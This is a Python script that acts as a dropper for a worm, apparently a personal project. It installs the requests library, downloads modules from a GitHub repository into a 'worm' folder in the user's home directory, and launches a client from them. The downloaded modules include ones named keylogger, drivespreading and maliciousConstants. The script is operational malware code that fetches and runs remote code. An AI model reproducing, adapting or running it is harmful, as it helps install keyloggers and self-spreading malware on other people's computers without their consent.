try:
    import sys
    import subprocess

    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=True)

    import os
    import requests
except Exception as error:
    print(error)
else:
    def get_project_files():
        owner = "EdanJacobson"
        repo = "ProjectCode"
        branch = "main"
        paths = {"malicious": ["drivespreading", "keylogger", "maliciousConstants"],
                 "clnt": ["client", "constants", "methods", "protocol"]}

        base_dir = os.path.join("C:/Users", os.getlogin(), "worm")

        for path in paths.keys():
            dir_path = os.path.join(base_dir, path)

            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
                init_file_path = os.path.join(dir_path, "__init__.py")
                with open(init_file_path, "x") as init_file:
                    pass  # An empty block, as we just want to create an empty file

            for file in paths.get(path):
                file_url = f"https://raw.githubusercontent.com/{owner}/{repo}/{branch}/{path}/{file}.py"
                response = requests.get(file_url)

                if response.status_code == 200:
                    content = response.content
                    output_file = os.path.join(dir_path, f"{file}.py")
                    sys.path.append(output_file)

                    with open(output_file, 'wb') as f:
                        f.write(content)
                else:
                    print(f"Failed to download file. Status code: {response.status_code}")


    def main():
        get_project_files()
        python_exe_path = sys.executable
        script_path = f"C:/Users/{os.getlogin()}/worm/clnt/client.py"
        subprocess.run([python_exe_path, script_path])

    if __name__ == '__main__':
        main()
